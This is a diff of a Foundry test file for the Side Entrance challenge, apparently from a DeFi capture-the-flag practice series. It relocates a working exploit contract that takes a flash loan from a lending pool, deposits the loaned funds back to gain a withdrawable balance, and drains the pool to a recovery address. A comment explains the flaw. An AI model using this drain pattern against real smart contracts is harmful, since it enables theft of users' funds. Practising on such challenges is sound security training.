@@ -8,37 +8,6 @@ import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLender
 
 
 
-contract SideEntranceExploit  {
-    SideEntranceLenderPool private pool;
-    address private recovery;
-
-    constructor(SideEntranceLenderPool _pool, address _recovery) {
-        pool = _pool;
-        recovery = _recovery;
-    }
-
-    function exploit() external {
-        uint256 poolBalance = address(pool).balance;
-        pool.flashLoan(poolBalance);
-
-        
-        pool.withdraw();
-        payable(recovery).transfer(address(this).balance);
-    }
-
-    
-    function execute() external payable {
-        //this satisfies the payback check and gets the balance that is required in withdraw()
-        pool.deposit{value: msg.value}();
-    }
-
-    receive() external payable {}
-}
-
-
-
-
-
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -83,7 +52,7 @@ contract SideEntranceChallenge is Test {
 
         exploit.exploit();
 
-        //this is why the exploit works: 'execute' function gets called during the flash loan giving an opportunity to deposit the borrowed funds back to get ‘balance’ then get the right to call withdraw
+        //this is why the exploit works: 'execute' function gets called during the flash loan giving an opportunity to deposit the borrowed funds back to get 'balance' then get the right to call withdraw
     }
 
     /**
@@ -99,3 +68,29 @@ contract SideEntranceChallenge is Test {
     }
 }
 
+contract SideEntranceExploit  {
+    SideEntranceLenderPool private pool;
+    address private recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function exploit() external {
+        uint256 poolBalance = address(pool).balance;
+        pool.flashLoan(poolBalance);
+
+
+        pool.withdraw();
+        payable(recovery).transfer(address(this).balance);
+    }
+
+
+    function execute() external payable {
+        //this satisfies the payback check and gets the balance that is required in withdraw()
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
